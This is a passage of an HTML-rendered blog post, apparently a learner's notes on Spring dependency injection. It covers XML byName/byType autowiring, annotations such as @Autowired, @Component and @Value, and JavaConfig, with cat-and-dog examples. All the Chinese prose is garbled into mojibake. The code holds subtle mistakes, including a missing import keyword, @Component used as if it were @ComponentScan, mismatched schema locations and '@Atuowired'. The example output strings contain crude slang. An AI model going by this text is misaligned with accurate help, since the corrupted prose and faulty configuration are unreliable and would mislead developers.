class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>byTypeï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span>  <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>byNameå°±æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾idå’Œæ‰€éœ€æ±‚åŒ¹é…çš„å€¼ï¼Œè€ŒbyTypeåˆ™æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å»å¯»æ‰¾å’Œç±»å‹ç›¸åŒç±»</p>
<p>äºæ˜¯æˆ‘åˆäº§ç”Ÿäº†ä¸€ä¸ªç–‘æƒ‘ï¼Œå¦‚æœå­˜åœ¨è·¨æ–‡ä»¶çš„æƒ…å†µå‘¢ï¼Ÿ</p>
<p>äºæ˜¯æˆ‘åˆåˆ›å»ºäº†ä¸€ä¸ªbean1.xmlæ¥å‚¨å­˜</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœï¼š</p>
<p>æœˆçŸ³ miao wang</p>
<p>ä½†æ˜¯å¦‚æœæˆ‘æŠŠbeansçš„æ³¨é‡Šä¹‹åå‘¢</p>
<p>åˆ™æ˜¯</p>
<p>dnm miao wang</p>
<p>è¿™å°±è¯´æ˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨beans.xmlè£…é…ä¹‹åï¼Œç³»ç»Ÿä¼šä¼˜å…ˆåœ¨å½“å‰xmlæ¥è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¹‹åæ‰ä¼šå»å…¶ä»–åœ°æ–¹æŸ¥æ‰¾</p>
<p>é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬éœ€è¦è®°ä½ï¼š</p>
<ul>
<li>å½“æˆ‘ä»¬ä½¿ç”¨byNameçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„idå”¯ä¸€ä¸”æ­£ç¡®</li>
<li>å½“æˆ‘ä»¬ä½¿ç”¨byTypeçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„classå”¯ä¸€ä¸”æ­£ç¡®</li>
</ul>
<h2 id="6-2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"><a href="#6-2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…" class="headerlink" title="6.2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"></a>6.2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…</h2><p>jdk1.5æ”¯æŒï¼Œspring2.5æ”¯æŒ</p>
<p>ä½¿ç”¨æ³¨è§£é¡»çŸ¥ï¼š</p>
<ol>
<li>å¯¼å…¥çº¦æŸ</li>
<li>é…ç½®æ³¨è§£çš„æ”¯æŒ</li>
</ol>
<p>å¿…é¡»å¯¼å…¥å¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹å•ä¸ªå€¼è¿›è¡Œæ³¨å…¥ã€‚</p>
<p>åœ¨Personç±»å½“ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä½¿ç”¨atuowiredæ³¨å…¥ä¹‹åï¼Œç”šè‡³è¿setæ–¹æ³•éƒ½ä¸éœ€è¦æ„é€ äº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ã€æ®è¯´æ˜¯å› ä¸ºä»–åˆ©ç”¨åå°„çš„æ–¹å¼è·å–ä»£ç ï¼Œæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚</p>
<p>å¦‚æœbeanå½“ä¸­çš„é…ç½®å¤šèµ·æ¥äº†ï¼Œæˆ‘ä»¬æƒ³æ„é€ çš„è¯ï¼Œå°±éœ€è¦é€šè¿‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Qualifier(value = &quot;cat&quot;)</span></span><br></pre></td></tr></table></figure>

<p>æ˜¾å¼çš„å®šä¹‰ä»£ç </p>
<h1 id="7-æ³¨è§£å¼€å‘"><a href="#7-æ³¨è§£å¼€å‘" class="headerlink" title="7.æ³¨è§£å¼€å‘"></a>7.æ³¨è§£å¼€å‘</h1><p>åœ¨Spring4ä¹‹åï¼Œæˆ‘ä»¬å¿…é¡»ä¿è¯Springçš„AOPåŒ…è¢«å¯¼å…¥</p>
<p>åœ¨ä½¿ç”¨æ³¨è§£çš„æ—¶å€™éœ€è¦å¯¼å…¥contextçº¦æŸï¼Œå¢åŠ æ³¨è§£çš„æ”¯æŒ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<ol>
<li><p>bean</p>
<p>å½“æˆ‘ä»¬ä½¿ç”¨æ³¨è§£ä¹‹åï¼Œbeanå¯ä»¥å¦‚ä¸‹æ–¹æ³•è¿›å…¥å¯¼å…¥ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼Œå¯¼å…¥åŒ…ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ­¥ï¼Œå»ç±»çš„ä¸Šé¢æ·»åŠ æ³¨é‡Šï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„@Componentï¼Œè¿™ä¸ªæ³¨è§£çš„æ„æ€ç­‰ä»·äº</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&#x27;user&#x27;</span> <span class="attr">class</span>=<span class="string">com.ys.pojo.user</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å±æ€§å¦‚ä½•æ³¨å…¥</p>
<p>ä½¿ç”¨ç±»æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥å€¼çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;æœˆçŸ³&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br></pre></td></tr></table></figure>

<p>ç­‰ä»·äºï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯é€šè¿‡è¿™æˆ‘ä»¬å°±å¯ä»¥æ˜ç™½ï¼Œæ³¨è§£æ³¨å…¥å€¼ä¸é€‚åˆæ³¨å…¥å¤æ‚ç±»å‹çš„å€¼ã€‚</p>
</li>
<li><p>è¡ç”Ÿçš„æ³¨è§£</p>
<p>é€šè¿‡@Componentåé¢ä¸ºäº†åˆ†å±‚ï¼Œæˆ‘ä»¬è¡ç”Ÿå‡ºäº†å¦‚ä¸‹æ³¨è§£ï¼š</p>
<ul>
<li>Dao:  @Repository</li>
<li>Service:  @Service</li>
<li>Controller: @Controller</li>
</ul>
<p>è¿™å››ä¸ªç±»çš„æœ¬è´¨éƒ½æ²¡æœ‰åŒºåˆ«ï¼Œéƒ½ä»£è¡¨æ³¨å†Œä¸€ä¸ªbeanå»XMLå½“ä¸­ï¼Œåªä¸è¿‡è¿™æ ·å†™å¯ä»¥ä½¿å¾—æˆ‘ä»¬MVCæ¶æ„æ›´åŠ æ¸…æ™°æ˜äº†</p>
</li>
<li><p>è‡ªåŠ¨è£…é…</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- <span class="meta">@Atuowired</span>: è‡ªåŠ¨è£…é…</span><br><span class="line">- <span class="meta">@Nullable</span>ï¼š å…è®¸å­—æ®µä¸º<span class="keyword">null</span></span><br><span class="line">- <span class="meta">@Resource</span>  ï¼šé€šè¿‡åå­—ï¼Œç±»å‹è‡ªåŠ¨è£…é…</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½œç”¨åŸŸ</p>
<p>å…¶å®é€šè¿‡æ³¨è§£ä¹Ÿå¯ä»¥å¯¹ä½œç”¨åŸŸè¿›è¡Œæ³¨è§£ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Scope()</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆä¸é€šè¿‡XMLå‘¢ï¼Ÿ</p>
</li>
<li><p>å°ç»“</p>
</li>
</ol>
<p>åœ¨è¿™ç« æˆ‘ä»¬å­¦ä¼šäº†åˆ©ç”¨æ³¨è§£è¿›è¡Œå¼€å‘ï¼Œå¯ä»¥é€šè¿‡æ³¨è§£æ‘†è„±XMLï¼Œä½†æ˜¯æˆ‘é€šè¿‡å­¦ä¹ è¿™ä¸€ç« èŠ‚ï¼Œæˆ‘æ„Ÿè§‰Springæ­¤æ—¶è¿˜æ˜¯ä¸å¤Ÿæˆç†Ÿï¼Œå¤§éƒ¨åˆ†çš„æ—¶å€™è¿˜æ˜¯åˆ©ç”¨XMLæ›´åŠ æ–¹ä¾¿ï¼Œå¤æ‚çš„ä¸œè¥¿ä¸¢ç»™XMLæ¥åšï¼Œç®€å•çš„åˆ©ç”¨æ³¨è§£æ³¨å…¥å°±è¡Œ</p>
<p>æ‰€ä»¥æœ€ä½³å®è·µåº”è¯¥æ˜¯ï¼š</p>
<ul>
<li>åˆ©ç”¨XMLæ‰‹åŠ¨çš„å»ºç«‹æ¯ä¸ªbeanï¼Œè¿™æ ·æ–¹ä¾¿ç¨‹åºå‘˜çš„äº’ç›¸åˆä½œ</li>
<li>XMLæ³¨å…¥MAPç±»å‹ç­‰</li>
<li>åˆ©ç”¨æ³¨é‡Šæ‰‹åŠ¨çš„æ³¨å…¥ç®€å•å€¼ï¼Œé™ä½å¼€å‘æˆæœ¬</li>
</ul>
<p>åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ï¼š</p>
<ul>
<li>XMLçš„ä¼˜åŠ¿å°±åœ¨äºä»–æ›´åŠ æ¸…æ¥šæ˜äº†ï¼Œèµ·ç åœ¨Springæ¥è¯´æ˜¯è¿™æ ·çš„ï¼ŒåŒæ—¶XMLè¿˜æ–¹ä¾¿è·¨æ–‡ä»¶é…åˆ</li>
<li>è€Œæ³¨è§£æ›´åŠ çš„æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå¼€å‘ï¼Œæ³¨å…¥å€¼ï¼Œé™ä½ç¨‹åºå‘˜çš„æˆæœ¬ï¼ˆä½†æ˜¯å¢åŠ äº†è¿ç»´çš„éš¾åº¦</li>
</ul>
<p>ä½¿ç”¨æ³¨è§£å¼€å‘çš„ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œè¿˜æ˜¯ä¸€ä¸ªäººä¸¤ä¸ªå® ç‰©ï¼š</p>
<p>ğŸ±çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ±ï¼šwdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ğŸ•çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line">org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ•ï¼šwdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>äººçš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;æœˆçŸ³&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">        user.getCat().shout();</span><br><span class="line">        user.getDog().shout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾ç„¶èƒ½å¤Ÿæ­£å¸¸çš„å¾—åˆ°ç»“æœ~</p>
<h1 id="8-å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring"><a href="#8-å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring" class="headerlink" title="8 å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring"></a>8 å®Œå…¨ä½¿ç”¨Javaé…ç½®Spring</h1><p>æˆ‘ä»¬ç°åœ¨è¦å®Œå…¨ä½¿ç”¨Javaconfigå®Œå…¨çš„ä»£æ›¿XMLäº†ï¼ŒSpringBootå½“ä¸­ä¹Ÿæ˜¯è¿™æ ·åšçš„ï¼Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ…Œï¼Œæ„Ÿè§‰æ²¡æœ‰èƒ½å¤Ÿé€‚åº”è¿‡æ¥</p>
<p>è¿˜æ˜¯å¾ˆæœ‰å¿…è¦å°†XMLçš„æ–¹å¼å’ŒJavaç±»çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨Javaconfigæ¥ä»£æ›¿XML</p>
<p>æ„é€ å¦‚ä¸‹Javaä»£ç :</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Component(&quot;com.ys.pojo&quot;)</span></span><br><span class="line"><span class="meta">@Import(JavaConfig2.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä½¿ç”¨@Configurationçš„æ„æ€ç­‰åŒäºï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> &gt;</span><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘ä»¬æ‰€æœ‰çš„é…ç½®éƒ½å¯ä»¥å†™åœ¨è¯¥ç±»å½“ä¸­</p>
<p>@Component(â€œcom.ys.pojoâ€)ç±»ç­‰åŒäºå¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ys&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†ä¸¤è€…ä¹‹é—´è¿›è¡Œè¿›ä¸€æ­¥çš„å¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é…ç½®ä¸€ä¸ªç±»çš„è¯ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªXMLæ ‡ç­¾ç­‰åŒäºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£å¦‚ä½•æ³¨å…¥å€¼å‘¢ï¼Ÿ</p>
<p>åœ¨XMLå½“ä¸­æˆ‘ä»¬æ˜¯è¿™æ ·æ“ä½œçš„ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€Œåˆ°äº†Javaconfigä¹‹ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;æœˆçŸ³&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬é€‰æ‹©ç›´æ¥ç”±ç±»æ¥æ³¨å…¥å€¼ï¼</p>
<p>è€ŒAutowiredä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œè¿˜æ˜¯ç›´æ¥åœ¨åŒ…ä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡çš„ç±»~ï¼Œæ¯”å¦‚æˆ‘ä»¬å°è¯•ç»§ç»­å­¦ä¹ ä¸¾ä¾‹ï¼Œä¸€ä¸ªäººæœ‰ä¸€åªçŒ«å’Œä¸€ä¸ªç‹—:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ğŸ±è¯´ï¼šwdnmdb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



